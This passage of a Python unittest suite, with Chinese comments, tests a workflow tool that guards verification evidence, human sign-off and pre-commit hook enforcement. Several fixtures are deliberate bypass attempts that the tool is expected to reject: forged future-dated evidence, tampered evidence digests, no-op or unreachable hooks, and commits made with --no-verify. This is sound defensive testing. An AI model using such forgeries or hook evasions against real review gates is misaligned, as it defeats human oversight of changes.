            self.assertEqual(list((r/'workflow/evidence').rglob('core/*.md')),[],'失敗時不得產生 core evidence')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_zero_checks_with_auto_policy_fails(self):
        td,r=self._repo('docs')
        try:
            x=self._verify(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('至少需要一個可執行的 automated check',out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_not_applicable_requires_reason(self):
        td,r=self._repo('docs')
        try:
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8').replace('Core verification policy: auto','Core verification policy: not-applicable'),encoding='utf-8')
            x=self._verify(r)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('Verification exception reason',x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_not_applicable_with_reason_produces_not_applicable_evidence(self):
        td,r=self._repo('docs')
        try:
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8')
                          .replace('Core verification policy: auto','Core verification policy: not-applicable')
                          .replace('Verification exception reason: none','Verification exception reason: 本 repo 僅包含靜態文件'),encoding='utf-8')
            x=self._verify(r)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)
            ev=sorted((r/'workflow/evidence/demo/core').glob('*.md'))
            self.assertEqual(len(ev),1)
            text=ev[0].read_text(encoding='utf-8')
            self.assertIn('Outcome: NOT_APPLICABLE',text)
            self.assertIn('Checks executed: 0',text)
            self.assertNotIn('Outcome: PASS',text)
        finally: shutil.rmtree(td,ignore_errors=True)

    def _status(self,r,text):
        import importlib.util,sys
        (r/'workflow/evidence/demo/core').mkdir(parents=True,exist_ok=True)
        p=r/'workflow/evidence/demo/core/20260101T000000Z.md'
        p.write_text(text,encoding='utf-8')
        sys.path.insert(0,str(r/'workflow/bin'))
        spec=importlib.util.spec_from_file_location('wt_rc5v',r/'workflow/bin/workflow_transition.py')
        m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
        try: return m.core_evidence_status(p)
        finally:
            sys.path.pop(0); sys.modules.pop('workflow_state',None)

    def test_validator_rejects_forged_and_legacy_evidence(self):
        td,r=self._repo('docs')
        try:
            ok,why=self._status(r,'# x\nCore evidence schema: 2\nVerification policy: auto\nChecks selected: 0\nChecks executed: 0\nOutcome: PASS\nOverall exit code: 0\n')
            self.assertFalse(ok); self.assertIn('零檢查',why)

            ok,why=self._status(r,'# Core Verification Evidence\n\nNo standard checks auto-detected.\n\nOverall exit code: 0\n')
            self.assertFalse(ok); self.assertIn('舊格式',why)

            # 政策不符：evidence 宣告 NOT_APPLICABLE 但 Profile 是 auto
            ok,why=self._status(r,'# x\nCore evidence schema: 2\nVerification policy: not-applicable\nChecks executed: 0\nException reason: 有理由\nOutcome: NOT_APPLICABLE\nOverall exit code: 0\n')
            self.assertFalse(ok); self.assertIn('政策不是 not-applicable',why)

            # 政策相符但理由空白 → 仍須拒絕
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8').replace('Core verification policy: auto','Core verification policy: not-applicable'),encoding='utf-8')
            ok,why=self._status(r,'# x\nCore evidence schema: 2\nVerification policy: not-applicable\nChecks executed: 0\nException reason: \nOutcome: NOT_APPLICABLE\nOverall exit code: 0\n')
            self.assertFalse(ok); self.assertIn('Exception reason',why)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_production_field_parsers_do_not_span_lines(self):
        """欄位留空時，四個 production parser 都不得抓到下一行的內容。

        `\\s` 包含換行，舊 pattern `:\\s*(.*?)\\s*$` 會跨行。這條直接呼叫 production
        函式，不是斷言一段硬編碼的 regex。
        """
        import importlib.util, sys
        td,r=self._repo('docs')
        try:
            sys.path.insert(0,str(r/'workflow/bin'))
            spec=importlib.util.spec_from_file_location('ws_span',r/'workflow/bin/workflow_state.py')
            ws=importlib.util.module_from_spec(spec); sys.modules['ws_span']=ws; spec.loader.exec_module(ws)
            spec2=importlib.util.spec_from_file_location('wt_span',r/'workflow/bin/workflow_transition.py')
            wt=importlib.util.module_from_spec(spec2); sys.modules['wt_span']=wt; spec2.loader.exec_module(wt)

            # 1) parse_state_text：Phase 留空、下一行剛好是合法值 → 必須拒絕，不得讀成 DISCOVERY
            bad=('# Workflow State\nPhase: \nDISCOVERY\nProject mode: UNSET\n'
                 'Active OpenSpec change: none\nSpec approved: no\nTest design approved: no\n'
                 'Verification passed: no\nApproved by: none\nLast updated: none\n')
            with self.assertRaises(ValueError, msg='Phase 留空時不得跨行讀到下一行的 DISCOVERY'):
                ws.parse_state_text(bad)

            # 2) _profile_field / verification_policy：理由留空 → 必須是空字串
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8')
                          .replace('Verification exception reason: none','Verification exception reason: '),encoding='utf-8')
            info=ws.verification_policy(r)
            self.assertEqual(info['exception_reason'],'',
                             f"理由留空時不得讀到下一行，實際讀到：{info['exception_reason']!r}")

            # 3) _evidence_field：Exception reason 留空、下一行是 Outcome → 必須是空字串
            got=wt._evidence_field('Exception reason: \nOutcome: NOT_APPLICABLE\n','Exception reason')
            self.assertEqual(got,'',f'不得讀到下一行，實際讀到：{got!r}')
        finally:
            sys.path.remove(str(r/'workflow/bin'))
            for m in ('ws_span','wt_span','workflow_state'): sys.modules.pop(m,None)
            shutil.rmtree(td,ignore_errors=True)


    def test_unittest_only_project_is_not_reported_as_missing_pytest(self):
        """`tests/` 只證明有測試，不證明用 pytest。

        unittest 專案不得被回報成「pytest configured but unavailable」——
        那會要求使用者安裝一個他們從未選用的工具。正確行為是回報零檢查，
        並引導到 not-applicable / custom。
        """
        import os
        td,r=self._repo('docs')
        try:
            (r/'tests').mkdir(exist_ok=True)
            (r/'tests/test_x.py').write_text('import unittest\n\nclass T(unittest.TestCase):\n    def test_x(self): self.assertTrue(True)\n',encoding='utf-8')
            (r/'pyproject.toml').write_text('[project]\nname = "p"\nversion = "0.1"\n',encoding='utf-8')
            x=self._verify(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertNotIn('pytest 已在專案中配置',out,'不得謊稱 pytest 已配置')
            self.assertIn('至少需要一個可執行的 automated check',out,'應回報零檢查並引導到 not-applicable/custom')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_declared_pytest_without_runner_is_reported(self):
        """對照組：明確宣告 pytest 但 runner 不可用時，仍必須回報 configured-but-unavailable。"""
        td,r=self._repo('docs')
        try:
            (r/'pyproject.toml').write_text('[project]\nname = "p"\nversion = "0.1"\n\n[tool.pytest.ini_options]\ntestpaths = ["tests"]\n',encoding='utf-8')
            x=self._verify(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('pytest 已在專案中配置',out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_validator_requires_self_consistent_check_records(self):
        """PASS 必須有與 Checks executed 相符、且全部 exit 0 的實際紀錄。"""
        td,r=self._repo('docs')
        try:
            cases=[
                ('宣稱 1 筆但沒有紀錄',
                 'Checks selected: 1\nChecks executed: 1\nOutcome: PASS\n','不自洽'),
                ('紀錄筆數不符',
                 'Checks selected: 3\nChecks executed: 3\nExit code: 0\nOutcome: PASS\n','不自洽'),
                ('有一筆 exit code 非 0',
                 'Checks selected: 2\nChecks executed: 2\nExit code: 0\nExit code: 1\nOutcome: PASS\n','exit code 非 0'),
                ('缺少 Checks selected',
                 'Checks executed: 1\nExit code: 0\nOutcome: PASS\n','必須包含 Checks selected'),
            ]
            for label,body,expect in cases:
                text=('# x\nCore evidence schema: 2\nChange: demo\nVerification policy: auto\n'
                      f'Approved profile digest: {self.approved_digest}\n'
                      +body+'Overall exit code: 0\n')
                ok,why=self._status(r,text)
                self.assertFalse(ok,f'{label} 應被拒絕')
                self.assertIn(expect,why,label)
            good=('# x\nCore evidence schema: 2\nChange: demo\nVerification policy: auto\n'
                  f'Approved profile digest: {self.approved_digest}\n'
                  'Checks selected: 2\nChecks executed: 2\nExit code: 0\nExit code: 0\nOutcome: PASS\nOverall exit code: 0\n')
            ok,why=self._status(r,good)
            self.assertTrue(ok,f'自洽的 PASS 應被接受：{why}')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_verification_pass_accepts_only_the_evidence_it_produced(self):
        """植入未來時間戳的偽造 evidence 不得被採信。

        latest_core 依檔名排序，因此舊實作會挑到偽造檔。新實作只驗證「本次執行產生的」那一份，
        並把它的相對路徑與 SHA-256 寫進 state-log。
        """
        import os, hashlib
        td,r=self._repo('docs')
        try:
            self._make_ready(r)
            forged=r/'workflow/evidence/demo/core/20991231T235959Z.md'
            forged.parent.mkdir(parents=True,exist_ok=True)
            # 形狀刻意與這個 repo 真正會產生的那一份一致（docs 專案 → not-applicable），
            # 讓偽造檔在「內容合法性」這一維度上與真品無法區分。
            forged.write_text('# forged\nCore evidence schema: 2\nChange: demo\n'
                              'Verification policy: not-applicable\n'
                              f'Approved profile digest: {self.approved_digest}\n'
                              'Checks selected: 0\nChecks executed: 0\n'
                              'Exception reason: 純文件專案，無自動化檢查\n'
                              'Outcome: NOT_APPLICABLE\nOverall exit code: 0\n',encoding='utf-8')
            # 前置斷言：偽造檔本身必須是「完全合法」的 evidence，
            # 否則這條測試會退化成「無效 evidence 被拒」，測不到真正的威脅模型。
            ok,why=self._status(r,forged.read_text(encoding='utf-8'))
            self.assertTrue(ok,f'偽造檔必須本身合法，才測得到「不是本次產生的不得採用」：{why}')

            env=dict(os.environ); env['PATH']='/usr/bin:/bin'
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','verification-pass','demo'],
                             cwd=r,env=env,capture_output=True,text=True)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)

            log=(r/'workflow/state-log.md').read_text(encoding='utf-8')
            self.assertIn('- Core evidence: ',log,'必須記錄被接受的 evidence 路徑')
            self.assertNotIn('20991231T235959Z',log,'偽造的未來時間戳檔案不得被採信')
            import re as _re
            m=_re.search(r'^- Core evidence: (.+)$',log,_re.M)
            accepted=r/m.group(1).strip()
            self.assertTrue(accepted.exists())
            d=_re.search(r'^- Core evidence sha256: ([0-9a-f]{64})$',log,_re.M)
            self.assertEqual(hashlib.sha256(accepted.read_bytes()).hexdigest(),d.group(1),'記錄的 digest 必須相符')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_archive_rejects_tampered_accepted_evidence(self):
        """archive 必須核對 verification-pass 所接受的那一份，digest 不符即拒絕。"""
        import os, re as _re
        td,r=self._repo('docs')
        try:
            self._make_ready(r)
            env=dict(os.environ); env['PATH']='/usr/bin:/bin'
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','verification-pass','demo'],
                             cwd=r,env=env,capture_output=True,text=True)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)

            ok=subprocess.run(['python3','workflow/bin/workflow_transition.py','archive','demo'],
                              cwd=r,env=env,capture_output=True,text=True)
            self.assertEqual(ok.returncode,0,'前置條件：未竄改時 archive 應通過\n'+ok.stdout+ok.stderr)

            st=r/'workflow/STATE.md'
            st.write_text(st.read_text(encoding='utf-8')
                          .replace('Phase: ARCHIVE','Phase: VERIFICATION'),encoding='utf-8')
            log=(r/'workflow/state-log.md').read_text(encoding='utf-8')
            accepted=r/_re.search(r'^- Core evidence: (.+)$',log,_re.M).group(1).strip()
            accepted.write_text(accepted.read_text(encoding='utf-8')+'\n# tampered\n',encoding='utf-8')

            bad=subprocess.run(['python3','workflow/bin/workflow_transition.py','archive','demo'],
                               cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(bad.returncode,0,bad.stdout+bad.stderr)
            self.assertIn('digest 不符',bad.stdout+bad.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def _make_ready(self,r):
        pp=r/'PROJECT-PROFILE.md'
        pp.write_text(pp.read_text(encoding='utf-8')
                      .replace('Core verification policy: auto','Core verification policy: not-applicable')
                      .replace('Verification exception reason: none','Verification exception reason: 純文件 repo'),encoding='utf-8')
        st=r/'workflow/STATE.md'
        st.write_text(st.read_text(encoding='utf-8')
                      .replace('Phase: DISCOVERY','Phase: ENGINEERING')
                      .replace('Spec approved: no','Spec approved: yes')
                      .replace('Test design approved: no','Test design approved: yes'),encoding='utf-8')
        d=r/'openspec/changes/demo'; d.mkdir(parents=True,exist_ok=True)
        for n in ('proposal.md','spec.md','tasks.md'): (d/n).write_text(n,encoding='utf-8')
        # 這個 helper 改了 Core verification policy，而 policy 現在**在 digest 裡面**。
        # 必須重新蓋章 —— 它模擬的是「人類批准了含 not-applicable 的那一份 profile」，
        # 不是「批准 A 之後偷偷換成 B」（後者正是新 gate 要擋的東西）。
        self.approved_digest=stamp_approved_profile(r)


    def test_archive_rejects_nested_evidence_path(self):
        """canonical evidence 必須是 core/ 的直接子檔案；子目錄不得通過。"""
        import os, hashlib
        td,r=self._repo('docs')
        try:
            self._make_ready(r)
            env=dict(os.environ); env['PATH']='/usr/bin:/bin'
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','verification-pass','demo'],
                             cwd=r,env=env,capture_output=True,text=True)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)

            # 把 evidence 搬進子目錄，並在 state-log 追加一筆指向它的記錄
            nested=r/'workflow/evidence/demo/core/nested'; nested.mkdir(parents=True,exist_ok=True)
            src=sorted((r/'workflow/evidence/demo/core').glob('*.md'))[0]
            dst=nested/src.name; dst.write_bytes(src.read_bytes())
            rel=str(dst.relative_to(r))
            digest=hashlib.sha256(dst.read_bytes()).hexdigest()
            log=r/'workflow/state-log.md'
            log.write_text(log.read_text(encoding='utf-8')+
                           f'\n## nested\n- Actor: machine-verified\n- Action: verification-pass\n'
                           f'- Change: demo\n- Core evidence: {rel}\n- Core evidence sha256: {digest}\n\n',
                           encoding='utf-8')
            bad=subprocess.run(['python3','workflow/bin/workflow_transition.py','archive','demo'],
                               cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(bad.returncode,0,bad.stdout+bad.stderr)
            self.assertIn('直接子檔案',bad.stdout+bad.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

class RC5HumanApprovalPromptTests(unittest.TestCase):
    """R8：Human Approval 的提示與失敗訊息。以真實 pty 驗證，不是斷言原始碼字串。

    G3-A 實測發現真人在「請輸入 change 名稱」連續兩次輸入了自己的名字，
    原因是兩個提示都在問「名稱」、`[change]` 的方括號看起來像預設值、
    且失敗訊息不說哪一格錯。
    """

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5-approval-')); r=td/'repo'; r.mkdir()
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        st=r/'workflow/STATE.md'
        st.write_text(st.read_text(encoding='utf-8')
                      .replace('Phase: DISCOVERY','Phase: SPEC_REVIEW')
                      .replace('Active OpenSpec change: none','Active OpenSpec change: demo'),encoding='utf-8')
        c=r/'openspec/changes/demo'; c.mkdir(parents=True,exist_ok=True)
        for n in ('proposal.md','spec.md','tasks.md'): (c/n).write_text(n,encoding='utf-8')
        # approve-spec 現在會在 TTY 之前要求 PROJECT-PROFILE 解析完成；
        # 本組測的是 TTY 提示本身，所以 fixture 必須先滿足那個前提。
        pf=r/'PROJECT-PROFILE.md'
        pf.write_text(pf.read_text(encoding='utf-8')
                      .replace('Type: UNKNOWN','Type: CLI')
                      .replace('Web verification required: auto','Web verification required: no')
                      .replace('Primary stack: UNKNOWN','Primary stack: Python 3.12')
                      .replace('Package manager: UNKNOWN','Package manager: uv')
                      .replace('Monorepo: UNKNOWN','Monorepo: no')
                      .replace('CI provider: UNKNOWN','CI provider: GitHub Actions')
                      .replace('Test database strategy: UNKNOWN','Test database strategy: not-applicable'),
                      encoding='utf-8')
        # approve-spec 現在要求被批准的內容已經在 HEAD、且三個來源一致。
        # 本組測的是 TTY 提示本身，所以 fixture 必須先滿足那個前提。
        commit_approved_artifacts(r,'demo')
        return td,r

    def _run_on_pty(self, repo, keystrokes, timeout=20):
        """以真實 pty 執行 approve-spec；子行程取得 controlling terminal，/dev/tty 可用。"""
        import pty, os, select, time
        pid, fd = pty.fork()
        if pid == 0:
            os.chdir(str(repo))
            os.execvp('python3',['python3','workflow/bin/workflow_transition.py','approve-spec','demo'])
            os._exit(127)
        out=b''
        try:
            for keys in keystrokes:
                os.write(fd, keys)
            deadline=time.time()+timeout
            while time.time()<deadline:
                r,_,_=select.select([fd],[],[],0.5)
                if not r: continue
                try: chunk=os.read(fd,4096)
                except OSError: break
                if not chunk: break
                out+=chunk
            _,status=os.waitpid(pid,0)
            code=os.waitstatus_to_exitcode(status)
        finally:
            try: os.close(fd)
            except OSError: pass
        return code, out.decode(errors='replace')

    def test_wrong_input_names_both_values_in_error(self):
        td,r=self._repo()
        try:
            code,out=self._run_on_pty(r,[b'WRONG-NAME\n'])
            self.assertEqual(code,21,out)
            self.assertIn('請逐字輸入「demo」以確認',out,'提示必須明講要輸入什麼，且不使用像預設值的方括號')
            self.assertNotIn('[demo]',out,'方括號會被誤認為「按 Enter 採用預設值」')
            self.assertIn('輸入的是「WRONG-NAME」',out,'失敗訊息必須回報實際輸入')
            self.assertIn('需要「demo」',out,'失敗訊息必須回報期望值')
            phase=subprocess.run(['python3','workflow/bin/workflow_transition.py','status'],cwd=r,capture_output=True,text=True).stdout
            self.assertIn('Phase: SPEC_REVIEW',phase,'失敗的批准不得改動 STATE')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_prompt_lists_the_profile_being_finalized(self):
        """approve-spec 同時定案 PROJECT-PROFILE，人類必須在確認畫面看到自己批准了什麼。

        不列出來等於要人類批准一份看不見的內容 —— 而這些值一旦定案，
        之後要改就得回 SPECIFICATION 重新 review。
        """
        td,r=self._repo()
        try:
            code,out=self._run_on_pty(r,[b'demo\n',b'jack\n'])
            self.assertEqual(code,0,out)
            self.assertIn('即將定案的 PROJECT-PROFILE',out,out)
            for expected in ('Python 3.12','uv','GitHub Actions','not-applicable'):
                self.assertIn(expected,out,f'確認畫面必須列出即將定案的值：缺 {expected}\n'+out)
            log=(r/'workflow/state-log.md').read_text(encoding='utf-8')
            self.assertIn('profile digest',log,'audit log 必須記錄這次定案的 profile digest\n'+log)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_actor_prompt_is_distinguishable_from_change_prompt(self):
        td,r=self._repo()
        try:
            code,out=self._run_on_pty(r,[b'demo\n',b'jack\n'])
            self.assertEqual(code,0,out)
            self.assertIn('這一欄才是簽名',out,'第二個提示必須與 change 名稱明確區隔')
            state=(r/'workflow/STATE.md').read_text(encoding='utf-8')
            self.assertIn('Phase: TEST_DESIGN',state)
            self.assertIn('Approved by: jack',state)
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5EnforcementProbeTests(unittest.TestCase):
    """Q-a：靜態比對無法證明可達性，必須實際執行 hook 並觀察 gate 拒絕。"""

    def _repo(self, bridge):
        td=Path(tempfile.mkdtemp(prefix='rc5-probe-')); r=td/'repo'; r.mkdir()
        (r/'src').mkdir(); (r/'src/a.py').write_text('x = 1\n')
        (r/'.husky').mkdir()
        h=r/'.husky/pre-commit'; h.write_text(f'#!/bin/sh\necho "husky running"\n{bridge}\n'); h.chmod(0o755)
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A'],['git','add','-A'],['git','commit','-m','base'],
                  ['git','config','core.hooksPath','.husky']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _probe(self,r):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status','--probe'],
                              cwd=r,capture_output=True,text=True)

    def test_unreachable_bridge_fails_probe(self):
        td,r=self._repo('if false; then bash .githooks/pre-commit; fi')
        try:
            x=self._probe(r)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('沒有攔下',x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_echoed_bridge_fails_probe(self):
        td,r=self._repo('echo bash .githooks/pre-commit')
        try:
            x=self._probe(r)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_real_bridge_passes_probe_without_side_effects(self):
        td,r=self._repo('bash .githooks/pre-commit || exit 1')
        try:
            x=self._probe(r)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('ACTIVE_CHAINED',x.stdout)
            dirty=subprocess.run(['git','status','--porcelain'],cwd=r,capture_output=True,text=True).stdout.strip()
            self.assertEqual(dirty,'','probe 不得動到 index 或 worktree')
            self.assertTrue((r/'.git/starter-enforcement-probe.json').exists(),'receipt 應存在 .git/ 內，不進 repo')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_receipt_invalidated_when_hooks_change(self):
        td,r=self._repo('bash .githooks/pre-commit || exit 1')
        try:
            self.assertEqual(self._probe(r).returncode,0)
            for target,label in ((r/'.husky/pre-commit','hook_sha256'),
                                 (r/'.githooks/pre-commit','gate_impl_sha256'),
                                 (r/'workflow/bin/check-implementation-gate.py','gate_impl_sha256')):
                original=target.read_text(encoding='utf-8')
                target.write_text(original+'# tampered\n',encoding='utf-8')
                s=subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status'],cwd=r,capture_output=True,text=True)
                self.assertNotEqual(s.returncode,0,f'{label} 變動後不得維持 active')
                self.assertIn('CHAINED_STATIC',s.stdout)
                self.assertIn(label,s.stdout)
                target.write_text(original,encoding='utf-8')
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5AuditPreInstallTests(unittest.TestCase):
    """D-7：全歷史 audit 標記到安裝前的 commit 時，訊息必須自我說明。"""

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5-audit-')); r=td/'repo'; r.mkdir()
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],['git','config','user.name','A']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        (r/'.claude').mkdir(); (r/'.claude/settings.json').write_text('{"permissions":{"allow":[]}}\n',encoding='utf-8')
        (r/'src').mkdir(); (r/'src/a.py').write_text('x = 1\n',encoding='utf-8')
        subprocess.run(['git','add','-A'],cwd=r,check=True)
        subprocess.run(['git','commit','-m','product baseline（Starter 尚不存在）'],cwd=r,check=True,capture_output=True)
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        subprocess.run(['git','add','-A'],cwd=r,check=True)
        subprocess.run(['git','commit','--no-verify','-m','install starter'],cwd=r,check=True,capture_output=True)
        return td,r

    def test_full_history_audit_explains_pre_install_commits(self):
        td,r=self._repo()
        try:
            empty=subprocess.run(['git','hash-object','-t','tree','/dev/null'],cwd=r,capture_output=True,text=True,check=True).stdout.strip()
            x=subprocess.run(['python3','workflow/bin/audit-control-plane.py',empty,'HEAD'],cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('早於 Starter 的安裝 baseline',out,'必須說明該 commit 早於安裝點')
            self.assertIn('merge-base',out,'必須給出可執行的解法')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_merge_base_range_has_no_spurious_note(self):
        td,r=self._repo()
        try:
            base=subprocess.run(['git','rev-parse','HEAD~1'],cwd=r,capture_output=True,text=True,check=True).stdout.strip()
            x=subprocess.run(['python3','workflow/bin/audit-control-plane.py',base,'HEAD'],cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertNotIn('早於 Starter 的安裝 baseline',out,'安裝後的範圍不應出現該註記')
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5Round2Tests(unittest.TestCase):
    """Codex 第二輪覆核找到的四個 P1。每條都對應他給的可重現案例。"""

    def _hook_repo(self, hook_body, managed_mode=0o755, track_managed=True):
        td=Path(tempfile.mkdtemp(prefix='rc5r2-')); r=td/'repo'; r.mkdir()
        (r/'src').mkdir(); (r/'src/a.py').write_text('x = 1\n')
        (r/'.husky').mkdir()
        h=r/'.husky/pre-commit'; h.write_text(hook_body); h.chmod(0o755)
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(managed_mode)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],['git','config','user.name','A']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        if track_managed:
            subprocess.run(['git','add','-A'],cwd=r,check=True)
        else:
            subprocess.run(['git','add','-A','--','.','::(exclude).githooks'],cwd=r,capture_output=True)
            subprocess.run(['git','add','-A'],cwd=r,check=True)
            subprocess.run(['git','rm','--cached','-q','.githooks/pre-commit'],cwd=r,capture_output=True)
        subprocess.run(['git','commit','-m','base'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','core.hooksPath','.husky'],cwd=r,check=True)
        return td,r

    def _status(self,r,*extra):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status',*extra],
                              cwd=r,capture_output=True,text=True)

    def test_probe_rejects_unrelated_control_plane_mention(self):
        """P1-1：另一個 checker 剛好提到 Control Plane 且回傳非零，不得被判為串接成功。"""
        td,r=self._hook_repo('#!/bin/sh\necho "unrelated checker: Control Plane unavailable" >&2\n'
                             'if false; then bash .githooks/pre-commit; fi\nexit 1\n')
        try:
            x=self._status(r,'--probe')
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('沒有 Starter gate 的拒絕訊號',x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_probe_rejects_deny_marker_without_probe_path(self):
        """P1-1 的第二個條件：輸出有精確的 gate DENY marker，但沒有指名本次 probe 造出的路徑，
        不能排除是其他 Control Plane 變更造成的拒絕 —— 必須拒絕。"""
        td,r=self._hook_repo('#!/bin/sh\n'
                             'echo "DENY: Control Plane 變更不可透過一般 commit" >&2\n'
                             'echo "  - M: workflow/bin/verify.sh" >&2\n'
                             'exit 20\n')
        try:
            x=self._status(r,'--probe')
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('沒有指名本次 probe 造出的路徑',x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_probe_verifies_indirect_integration_without_static_bridge(self):
        """P1-2：透過變數間接呼叫 gate 的 hook，靜態看不出來，但 probe 驗得出。"""
        td,r=self._hook_repo('#!/bin/sh\nGATE=".githooks/pre-commit"\nbash "$GATE" || exit 1\n')
        try:
            before=self._status(r)
            self.assertNotEqual(before.returncode,0,'probe 之前不得判為 active')
            self.assertIn('UNKNOWN',before.stdout,'無靜態 bridge 的自訂整合應為 UNKNOWN')
            after=self._status(r,'--probe')
            self.assertEqual(after.returncode,0,after.stdout+after.stderr)
            self.assertIn('ACTIVE_CHAINED',after.stdout,'行為驗證通過就應算 active，不得要求靜態命中')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_managed_hook_untracked_is_not_active(self):
        """P1-3：.githooks/pre-commit 未被追蹤時，clone 之後不會存在，不得判為 active。"""
        td,r=self._hook_repo('#!/bin/sh\nexit 0\n')
        try:
            subprocess.run(['git','rm','--cached','-q','.githooks/pre-commit'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','commit','-m','untrack hook'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','config','core.hooksPath','.githooks'],cwd=r,check=True)
            x=self._status(r)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('未被 Git 追蹤',x.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_committed_noop_managed_hook_is_not_active(self):
        """P1-3：把 managed hook 換成空轉 hook 並 commit 後，tracked+100755+內容一致全部成立，
        但它不會攔下任何東西 —— 不得回報 ACTIVE_MANAGED。"""
        td,r=self._hook_repo('#!/bin/sh\nexit 0\n')
        try:
            subprocess.run(['git','config','core.hooksPath','.githooks'],cwd=r,check=True)
            ok=self._status(r,'--probe')
            self.assertEqual(ok.returncode,0,'前置條件：正常 hook 應能通過行為驗證\n'+ok.stdout+ok.stderr)

            m=r/'.githooks/pre-commit'
            m.write_text('#!/bin/sh\nexit 0\n',encoding='utf-8')
            m.chmod(0o755)
            subprocess.run(['git','add','.githooks/pre-commit'],cwd=r,check=True)
            subprocess.run(['git','commit','--no-verify','-m','noop hook'],cwd=r,check=True,capture_output=True)

            bad=self._status(r)
            self.assertNotEqual(bad.returncode,0,'commit 過的空轉 hook 仍不得判為 active\n'+bad.stdout+bad.stderr)
